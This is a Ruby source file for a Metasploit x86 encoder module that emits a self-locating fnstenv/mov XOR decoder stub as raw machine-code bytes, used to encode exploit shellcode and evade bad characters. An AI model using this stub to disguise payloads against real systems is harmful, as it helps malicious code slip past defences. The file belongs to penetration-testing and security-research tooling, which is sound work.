require 'msf/core'

module Msf
module Encoders
module X86

class FnstenvMov < Msf::Encoder::Xor

	def initialize
		super(
			'Name'             => 'Variable-length fnstenv/mov dword xor encoder',
			'Version'          => '$Revision$',
			'Description'      => 'Variable-length fnstenv/mov dword xor encoder',
			'Author'           => 'spoonm',
			'Arch'             => ARCH_X86,
			'Decoder'          =>
				{
					'KeySize'   => 4,
					'BlockSize' => 4,
				})
	end

	#
	# Returns the decoder stub that is adjusted for the size of the buffer
	# being encoded.
	#
	def decoder_stub(state)
		decoder = 
			Rex::Arch::X86.set((((state.buf.length - 1) / 4) + 1), 
				Rex::Arch::X86::ECX,
				state.badchars) +
			"\xd9\xee" +              # fldz
			"\xd9\x74\x24\xf4" +      # fnstenv [esp - 12]
			"\x5b" +                  # pop ebx
			"\x81\x73\x13XORK" +      # xor_xor: xor DWORD [ebx + 22], xorkey
			"\x83\xeb\xfc" +          # sub ebx,-4
			"\xe2\xf4"                # loop xor_xor

		state.decoder_key_offset = decoder.index('XORK')

		return decoder
	end

end

end end end
